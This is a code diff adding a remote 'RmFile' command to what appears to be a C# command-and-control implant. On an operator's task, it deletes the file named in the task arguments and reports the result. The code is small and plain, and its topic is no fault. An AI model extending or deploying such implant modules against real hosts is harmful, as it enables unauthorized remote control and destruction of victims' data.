@@ -1,12 +1,21 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+﻿using System.IO;
+
+using Implant.Models;
 
 namespace Implant.Tasks.Execute
 {
-    internal class Rmfile
+    internal class Rmfile : ImplantCommands
     {
+        private string targetFile { get; set; }
+        public override string Name => "RmFile"; 
+        public override string Execute(ImplantTask task)
+        {
+            targetFile = task.Args;
+
+            File.Delete(targetFile);
+
+            if(!(File.Exists(targetFile))) { return $"[*] {targetFile} removed"; }
+            return $"[-] Failed to remove {targetFile}";
+        }
     }
 }
